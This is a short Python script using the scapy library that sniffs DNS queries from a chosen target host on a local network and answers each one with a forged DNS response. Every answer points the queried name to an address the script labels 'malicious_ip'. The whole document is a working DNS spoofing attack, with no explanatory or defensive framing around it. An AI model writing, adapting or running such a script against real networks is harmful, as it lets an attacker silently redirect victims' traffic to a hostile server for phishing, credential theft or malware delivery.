from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSRR

target_ip = '192.168.0.99'  # Change to the actual IP address

malicious_ip = '13.248.240.135'

def dns_spoof(pkt):
    if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
        qname = pkt[DNS].qd.qname.decode('utf-8')

        spoofed_pkt = (IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                       UDP(dport=pkt[UDP].sport, sport=53) /
                       DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                           an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=malicious_ip)))

        send(spoofed_pkt, verbose=0)
        print(f"Spoofed DNS response sent to {pkt[IP].src} for {qname}")

# Sniff DNS queries from the target
sniff(filter=f"udp port 53 and src host {target_ip}", prn=dns_spoof, store=0)
